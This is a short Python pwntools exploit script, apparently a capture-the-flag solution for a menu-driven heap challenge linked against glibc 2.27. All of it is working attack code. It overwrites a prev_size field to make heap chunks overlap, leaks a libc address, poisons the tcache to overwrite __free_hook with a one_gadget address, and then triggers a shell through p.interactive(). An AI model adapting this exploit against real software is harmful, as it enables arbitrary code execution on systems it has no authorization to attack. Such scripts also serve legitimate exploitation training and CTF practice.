from pwn import*
from LD import*
def add(size,data):
	p.sendlineafter('Your choice :','1')
	p.sendlineafter('Size:',str(size))
	p.sendafter('Data: ',data)
def free(index):
	p.sendlineafter('Your choice :','2')
	p.sendlineafter('Index: ',str(index))
def show():
	p.sendlineafter('Your choice :','3')
libc = ELF('./libc-2.27.so',checksec=False)
LD=change_ld('./main','./ld-2.27.so')
p = LD.process(env={'LD_PRELOAD':'./libc-2.27.so'})
context.log_level = 'DEBUG'
add(0x500,'FMYY\n')
add(0x28,'FMYY\n')
add(0x4F0,'FMYY\n')
add(0x10,'FMYY\n')
free(0)
free(1)
add(0x28,'\x00'*0x20 + p64(0x540))
free(2)
add(0x500,'FMYY\n')
show()
p.recvuntil('0 : ')
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x60 - libc.sym['__malloc_hook'] - 0x10
libc.address = libc_base
og = [0x4F2C5,0x4F322,0x10A38C]
add(0x48,'FMYY\n')
free(2)
free(0)
add(0x48,p64(libc.sym['__free_hook']) + '\n')
add(0x48,'FMYY\n')
add(0x48,p64(libc_base+og[1]) + '\n')
free(3)
p.interactive()


